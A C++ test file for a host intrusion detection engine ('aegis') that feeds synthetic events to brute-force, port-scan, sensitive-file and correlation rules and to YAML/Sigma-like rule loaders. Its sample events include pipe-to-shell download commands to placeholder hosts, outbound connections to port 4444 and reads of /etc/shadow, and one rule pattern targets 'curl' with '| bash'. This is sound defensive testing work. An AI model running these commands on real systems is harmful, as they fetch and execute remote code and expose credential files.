#include <cstdlib>
#include <exception>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <random>
#include <stdexcept>
#include <string>
#include <vector>

#include <nlohmann/json.hpp>

#include "detection/rule.hpp"
#include "detection/rule_engine.hpp"
#include "pipeline/event_validator.hpp"

namespace {

using json = nlohmann::json;

void expect(bool condition, const std::string& message) {
    if (!condition) {
        throw std::runtime_error(message);
    }
}

std::string dump_event(const json& event_body,
                       const std::string& event_type,
                       const std::string& severity = "info",
                       const std::string& process_guid = "proc-guid-001",
                       const std::string& event_id = "evt-001") {
    json doc;
    doc["schema_version"] = "v1.1";
    doc["event_id"] = event_id;
    doc["ts"] = "2026-03-11T12:00:00Z";
    doc["host"] = "host-01";
    doc["agent_id"] = "collector-test";
    doc["source"] = "collector.sim";
    doc["event_type"] = event_type;
    doc["severity"] = severity;
    doc["tenant_id"] = "default";
    doc["trace_id"] = "trace-001";
    if (!process_guid.empty()) {
        doc["process_guid"] = process_guid;
    }
    doc["event"] = event_body;
    return doc.dump();
}

json process_body(const std::string& name,
                  const std::string& cmdline,
                  const std::string& exe = "/usr/bin/bash",
                  const std::string& user_name = "alice") {
    json process;
    process["process"] = {
        {"pid", 4242},
        {"ppid", 1},
        {"uid", 1000},
        {"user_name", user_name},
        {"name", name},
        {"exe", exe},
        {"cmdline", cmdline},
        {"process_start_time", "2026-03-11T12:00:00Z"}
    };
    return process;
}

json auth_body(const std::string& user_name, const std::string& src_ip, const std::string& method = "ssh") {
    json auth;
    auth["auth"] = {
        {"user_name", user_name},
        {"method", method},
        {"src_ip", src_ip},
        {"reason", "invalid_password"}
    };
    return auth;
}

json network_body(uint32_t dst_port,
                  const std::string& dst_ip = "10.10.10.10",
                  const std::string& process_guid = "proc-guid-001") {
    json net;
    net["network"] = {
        {"pid", 4242},
        {"process_guid", process_guid},
        {"protocol", "tcp"},
        {"src_ip", "192.168.1.20"},
        {"src_port", 50000},
        {"dst_ip", dst_ip},
        {"dst_port", dst_port},
        {"direction", "outbound"}
    };
    return net;
}

json file_body(const std::string& path,
               const json& flags,
               const std::string& user_name = "alice",
               const std::string& process_guid = "proc-guid-001") {
    json file;
    file["file"] = {
        {"pid", 4242},
        {"process_guid", process_guid},
        {"user_name", user_name},
        {"path", path},
        {"flags", flags},
        {"result", "success"}
    };
    return file;
}

aegis::ParsedEvent validate_ok(aegis::pipeline::EventValidator& validator,
                               const std::string& raw_json) {
    auto result = validator.validate(raw_json);
    expect(std::holds_alternative<aegis::ParsedEvent>(result), "expected validation success");
    return std::get<aegis::ParsedEvent>(std::move(result));
}

void test_validator_accepts_valid_process_event() {
    aegis::pipeline::EventValidator validator;
    auto event = validate_ok(validator, dump_event(process_body("bash", "bash -c whoami"), "process_start"));
    expect(event.event_type == "process_start", "process_start event_type mismatch");
    expect(event.user_name == "alice", "process user_name extraction mismatch");
}

void test_validator_rejects_missing_field() {
    aegis::pipeline::EventValidator validator;
    json broken = json::parse(dump_event(process_body("bash", "bash -c whoami"), "process_start"));
    broken.erase("tenant_id");
    auto result = validator.validate(broken.dump());
    expect(std::holds_alternative<aegis::ValidationFail>(result), "expected validation failure");
}

void test_rule_engine_loads_expanded_rule_set() {
    aegis::detection::RuleEngine rule_engine;
    expect(rule_engine.rule_count() >= 15, "expected at least 15 built-in rules");
}

void test_auth_bruteforce_rule_fires_on_threshold() {
    aegis::pipeline::EventValidator validator;
    aegis::detection::AuthBruteForceRule rule;

    for (int index = 0; index < 4; ++index) {
        auto event = validate_ok(validator, dump_event(auth_body("root", "192.168.1.77"), "auth_failure", "low", "", "evt-auth-" + std::to_string(index)));
        expect(!rule.evaluate(event).has_value(), "bruteforce fired too early");
    }

    auto fifth = validate_ok(validator, dump_event(auth_body("root", "192.168.1.77"), "auth_failure", "low", "", "evt-auth-5"));
    auto match = rule.evaluate(fifth);
    expect(match.has_value(), "bruteforce rule did not fire on threshold");
}

void test_password_spray_rule_fires_on_distinct_users() {
    aegis::pipeline::EventValidator validator;
    aegis::detection::AuthPasswordSprayRule rule;

    for (int index = 0; index < 5; ++index) {
        auto event = validate_ok(validator, dump_event(auth_body("user" + std::to_string(index), "10.0.0.9"), "auth_failure", "low", "", "evt-spray-" + std::to_string(index)));
        expect(!rule.evaluate(event).has_value(), "password spray fired too early");
    }

    auto sixth = validate_ok(validator, dump_event(auth_body("user5", "10.0.0.9"), "auth_failure", "low", "", "evt-spray-5"));
    auto match = rule.evaluate(sixth);
    expect(match.has_value(), "password spray rule did not fire on distinct-user threshold");
}

void test_network_port_scan_rule_fires_on_unique_ports() {
    aegis::pipeline::EventValidator validator;
    aegis::detection::NetworkPortScanRule rule;

    for (uint32_t port = 10000; port < 10011; ++port) {
        auto event = validate_ok(validator, dump_event(network_body(port), "network_connect", "medium", "proc-guid-001", "evt-net-" + std::to_string(port)));
        expect(!rule.evaluate(event).has_value(), "port scan fired too early");
    }

    auto twelfth = validate_ok(validator, dump_event(network_body(10011), "network_connect", "medium", "proc-guid-001", "evt-net-10011"));
    auto match = rule.evaluate(twelfth);
    expect(match.has_value(), "port scan rule did not fire on threshold");
}

void test_sensitive_file_access_rule_fires() {
    aegis::pipeline::EventValidator validator;
    aegis::detection::SensitiveFileAccessRule rule;

    auto event = validate_ok(validator, dump_event(file_body("/etc/shadow", json::array({"O_RDONLY"})), "file_open"));
    auto match = rule.evaluate(event);
    expect(match.has_value(), "sensitive file access rule did not fire");
}

void test_correlation_execution_to_rare_port_fires() {
    aegis::pipeline::EventValidator validator;
    aegis::detection::CorrelatedExecutionToRarePortRule rule;

    auto stage1 = validate_ok(
        validator,
        dump_event(process_body("bash", "curl http://example/payload.sh | bash"),
                   "process_start",
                   "medium",
                   "corr-proc-01",
                   "evt-corr-stage1"));
    expect(!rule.evaluate(stage1).has_value(), "correlation execution rule fired on stage1");

    auto stage2 = validate_ok(
        validator,
        dump_event(network_body(4444, "203.0.113.10", "corr-proc-01"),
                   "network_connect",
                   "medium",
                   "corr-proc-01",
                   "evt-corr-stage2"));
    auto match = rule.evaluate(stage2);
    expect(match.has_value(), "correlation execution rule did not fire on stage2");
}

void test_correlation_auth_to_sensitive_file_fires() {
    aegis::pipeline::EventValidator validator;
    aegis::detection::CorrelatedAuthToSensitiveFileRule rule;

    for (int index = 0; index < 5; ++index) {
        auto auth_event = validate_ok(
            validator,
            dump_event(auth_body("bob", "198.51.100.11"),
                       "auth_failure",
                       "medium",
                       "",
                       "evt-corr-auth-" + std::to_string(index)));
        expect(!rule.evaluate(auth_event).has_value(), "auth->file correlation fired too early");
    }

    auto file_event = validate_ok(
        validator,
        dump_event(file_body("/etc/shadow", json::array({"O_RDONLY"}), "bob", "proc-file-01"),
                   "file_open",
                   "high",
                   "proc-file-01",
                   "evt-corr-file"));
    auto match = rule.evaluate(file_event);
    expect(match.has_value(), "auth->file correlation rule did not fire on stage2");
}

bool contains_rule_id(const std::vector<aegis::RuleMatch>& matches,
                      const std::string& rule_id) {
    for (const auto& match : matches) {
        if (match.rule_id == rule_id) return true;
    }
    return false;
}

std::size_t count_rule_id(const std::vector<aegis::RuleMatch>& matches,
                          const std::string& rule_id) {
    std::size_t count = 0;
    for (const auto& match : matches) {
        if (match.rule_id == rule_id) ++count;
    }
    return count;
}

std::optional<std::string> summary_for_rule_id(const std::vector<aegis::RuleMatch>& matches,
                                               const std::string& rule_id) {
    for (const auto& match : matches) {
        if (match.rule_id == rule_id) return match.summary;
    }
    return std::nullopt;
}

std::filesystem::path make_temp_rule_dir() {
    std::random_device rd;
    std::mt19937_64 gen(rd());
    std::uniform_int_distribution<unsigned long long> dis;
    const auto suffix = std::to_string(dis(gen));
    const auto dir = std::filesystem::temp_directory_path() / ("aegis-ext-rules-" + suffix);
    std::filesystem::create_directories(dir);
    return dir;
}

void test_external_yaml_loader_loads_and_matches_rule() {
    const auto tmp_dir = make_temp_rule_dir();
    const auto rule_path = tmp_dir / "ext-test-rule.yml";

    {
        std::ofstream out(rule_path);
        out << "id: ext-test-process-cmdline\n";
        out << "name: External Test Process Rule\n";
        out << "event_type: process_start\n";
        out << "severity: high\n";
        out << "risk_score: 83\n";
        out << "summary: External test rule hit\n";
        out << "summary_template: Process {{event.process.name}} on {{host}} by {{event.process.user_name}} matched {{rule.id}}\n";
        out << "tags: [external, test]\n";
        out << "match: all\n";
        out << "conditions:\n";
        out << "  - path: event.process.cmdline\n";
        out << "    op: contains\n";
        out << "    value: invoke-credentialdump\n";
    }

    aegis::pipeline::EventValidator validator;
    aegis::detection::RuleEngine rule_engine;
    const std::size_t base_count = rule_engine.rule_count();
    const std::size_t loaded = rule_engine.load_external_rules_from_dir(tmp_dir.string());

    expect(loaded == 1, "expected exactly one external rule to load");
    expect(rule_engine.rule_count() == base_count + 1, "rule count did not increase after external load");

    const auto event = validate_ok(
        validator,
        dump_event(process_body("bash", "bash -c invoke-credentialdump"),
                   "process_start",
                   "medium",
                   "ext-proc-01",
                   "evt-ext-rule"));
    const auto matches = rule_engine.evaluate(event);
    expect(contains_rule_id(matches, "ext-test-process-cmdline"),
           "external YAML rule did not match expected event");
        expect(matches.size() == 1, "expected one external YAML match");
        expect(matches.front().summary == "Process bash on host-01 by alice matched ext-test-process-cmdline",
            "summary_template did not render expected external YAML summary");

    std::error_code ec;
    std::filesystem::remove_all(tmp_dir, ec);
}

void test_correlation_auth_process_rare_port_fires() {
    aegis::pipeline::EventValidator validator;
    aegis::detection::CorrelatedAuthProcessRarePortRule rule;

    for (int index = 0; index < 5; ++index) {
        auto auth_event = validate_ok(
            validator,
            dump_event(auth_body("eve", "203.0.113.77"),
                       "auth_failure",
                       "medium",
                       "",
                       "evt-3stage-auth-" + std::to_string(index)));
        expect(!rule.evaluate(auth_event).has_value(), "3-stage rule fired during auth stage");
    }

    auto process_event = validate_ok(
        validator,
        dump_event(process_body("bash", "curl http://malicious/payload.sh | bash", "/usr/bin/bash", "eve"),
                   "process_start",
                   "high",
                   "proc-3stage-01",
                   "evt-3stage-proc"));
    expect(!rule.evaluate(process_event).has_value(), "3-stage rule fired during process stage");

    auto network_event = validate_ok(
        validator,
        dump_event(network_body(4444, "198.51.100.200", "proc-3stage-01"),
                   "network_connect",
                   "high",
                   "proc-3stage-01",
                   "evt-3stage-net"));
    auto match = rule.evaluate(network_event);
    expect(match.has_value(), "3-stage correlation rule did not fire on network stage");
}

void test_external_sigma_like_loader_matches_rule() {
    const auto tmp_dir = make_temp_rule_dir();
    const auto rule_path = tmp_dir / "sigma-like-test.yml";

    {
        std::ofstream out(rule_path);
        out << "title: Sigma Like Suspicious Download\n";
        out << "id: sigma-like-download-test\n";
        out << "level: high\n";
        out << "description: sigma-like parser smoke test\n";
        out << "detection:\n";
        out << "  selection_download:\n";
        out << "    event_type: process_start\n";
        out << "    event.process.cmdline|contains:\n";
        out << "      - curl\n";
        out << "      - '| bash'\n";
        out << "  condition: 1 of selection*\n";
    }

    aegis::pipeline::EventValidator validator;
    aegis::detection::RuleEngine rule_engine;
    const std::size_t loaded = rule_engine.load_external_rules_from_dir(tmp_dir.string());
    expect(loaded == 1, "expected one sigma-like rule to load");

    const auto event = validate_ok(
        validator,
        dump_event(process_body("bash", "bash -c curl http://x/p.sh | bash"),
                   "process_start",
                   "high",
                   "proc-sigma-01",
                   "evt-sigma-rule"));
    const auto matches = rule_engine.evaluate(event);
    expect(contains_rule_id(matches, "sigma-like-download-test"),
           "sigma-like external rule did not match expected event");

    std::error_code ec;
    std::filesystem::remove_all(tmp_dir, ec);
}

void test_external_yaml_threshold_reduces_noise() {
    const auto tmp_dir = make_temp_rule_dir();
    const auto rule_path = tmp_dir / "ext-threshold-auth.yml";

    {
        std::ofstream out(rule_path);
        out << "id: ext-threshold-auth\n";
        out << "name: External Threshold Auth\n";
        out << "event_type: auth_failure\n";
        out << "severity: high\n";
        out << "risk_score: 80\n";
        out << "summary: Thresholded external auth rule\n";
        out << "summary_template: Repeated auth failures on {{host}} for {{event.auth.user_name}} from {{event.auth.src_ip}} ({{match.current_hits}}/{{rule.min_hits}})\n";
        out << "match: all\n";
        out << "min_hits: 3\n";
        out << "window_seconds: 600\n";
        out << "alert_cooldown_seconds: 600\n";
        out << "group_by: [host, event.auth.user_name, event.auth.src_ip]\n";
        out << "conditions:\n";
        out << "  - path: event.auth.user_name\n";
        out << "    op: equals\n";
        out << "    value: root\n";
    }

    aegis::pipeline::EventValidator validator;
    aegis::detection::RuleEngine rule_engine;
    const std::size_t loaded = rule_engine.load_external_rules_from_dir(tmp_dir.string());
    expect(loaded == 1, "expected one thresholded external rule to load");

    std::size_t fired = 0;
    std::string fired_summary;
    for (int index = 0; index < 5; ++index) {
        const auto ev = validate_ok(
            validator,
            dump_event(auth_body("root", "203.0.113.44"),
                       "auth_failure",
                       "medium",
                       "",
                       "evt-threshold-" + std::to_string(index)));
        const auto matches = rule_engine.evaluate(ev);
        fired += count_rule_id(matches, "ext-threshold-auth");
        const auto summary = summary_for_rule_id(matches, "ext-threshold-auth");
        if (summary.has_value()) {
            fired_summary = *summary;
        }
    }

    expect(fired == 1, "thresholded external rule should fire once within cooldown window");
    expect(fired_summary == "Repeated auth failures on host-01 for root from 203.0.113.44 (3/3)",
           "thresholded external summary_template did not render expected hit counters");

    std::error_code ec;
    std::filesystem::remove_all(tmp_dir, ec);
}

}  // namespace

int main() {
    try {
        test_validator_accepts_valid_process_event();
        test_validator_rejects_missing_field();
        test_rule_engine_loads_expanded_rule_set();
        test_auth_bruteforce_rule_fires_on_threshold();
        test_password_spray_rule_fires_on_distinct_users();
        test_network_port_scan_rule_fires_on_unique_ports();
        test_sensitive_file_access_rule_fires();
        test_correlation_execution_to_rare_port_fires();
        test_correlation_auth_to_sensitive_file_fires();
        test_correlation_auth_process_rare_port_fires();
        test_external_yaml_loader_loads_and_matches_rule();
        test_external_sigma_like_loader_matches_rule();
        test_external_yaml_threshold_reduces_noise();
        std::cout << "aegis_engine_tests: all tests passed\n";
        return EXIT_SUCCESS;
    } catch (const std::exception& ex) {
        std::cerr << "aegis_engine_tests: failure: " << ex.what() << '\n';
        return EXIT_FAILURE;
    }
}